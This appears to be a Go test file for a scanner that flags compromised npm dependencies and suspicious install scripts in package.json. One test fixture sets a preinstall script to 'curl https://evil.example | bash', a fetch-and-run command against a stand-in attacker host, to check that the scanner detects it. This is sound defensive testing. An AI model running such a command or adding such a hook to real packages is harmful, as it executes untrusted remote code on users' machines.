package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func writeFile(t *testing.T, dir, rel, content string) string {
	t.Helper()
	full := filepath.Join(dir, rel)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatalf("MkdirAll failed: %v", err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile failed: %v", err)
	}
	return full
}

func TestCollectDependencies_MergesAllSections(t *testing.T) {
	p := &PackageJSON{
		Dependencies: map[string]string{
			"dep1": "1.0.0",
		},
		DevDependencies: map[string]string{
			"dep1": "2.0.0",
			"dep2": "1.0.0",
		},
		PeerDependencies: map[string]string{
			"dep3": "1.0.0",
		},
		OptionalDependencies: map[string]string{
			"dep4": "1.0.0",
		},
	}

	deps := collectDependencies(p)

	if len(deps) != 4 {
		t.Fatalf("expected 4 deps, got %d", len(deps))
	}

	if deps["dep1"] != "1.0.0" {
		t.Fatalf("expected dep1 from Dependencies to win, got %s", deps["dep1"])
	}
}

func TestRunScan_DetectsCompromisedDirectDependency(t *testing.T) {
	// Setup DB
	masterPackages = MasterPackages{
		Version:     "test",
		LastUpdated: "2024-01-01T00:00:00Z",
		Packages: []MasterPackage{
			{Name: "badpkg", Severity: SeverityCritical},
		},
	}
	affectedPackageNames = map[string]Severity{
		"badpkg": SeverityCritical,
	}

	tmp := t.TempDir()

	pkg := PackageJSON{
		Dependencies: map[string]string{
			"badpkg": "1.0.0",
			"okpkg":  "2.0.0",
		},
	}

	data, _ := json.Marshal(pkg)
	writeFile(t, tmp, "package.json", string(data))

	summary := runScan(tmp, false)

	if summary.AffectedCount != 1 {
		t.Fatalf("expected 1 affected package, got %d", summary.AffectedCount)
	}

	if len(summary.Results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(summary.Results))
	}

	r := summary.Results[0]
	if r.Package != "badpkg" {
		t.Fatalf("expected badpkg, got %s", r.Package)
	}
	if !r.IsDirect {
		t.Fatalf("expected direct dependency")
	}
	if r.Location == "" {
		t.Fatalf("expected location to be populated")
	}
}

func TestRunScan_FindsSuspiciousScript(t *testing.T) {
	// Empty DB
	masterPackages = MasterPackages{}
	affectedPackageNames = map[string]Severity{}

	tmp := t.TempDir()

	pkg := PackageJSON{
		Scripts: map[string]string{
			"preinstall": "curl https://evil.example | bash",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, tmp, "package.json", string(data))

	summary := runScan(tmp, false)

	if len(summary.SecurityFindings) == 0 {
		t.Fatalf("expected at least one finding")
	}

	found := false
	for _, f := range summary.SecurityFindings {
		if f.Type == "suspicious-script" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("suspicious-script not detected")
	}
}
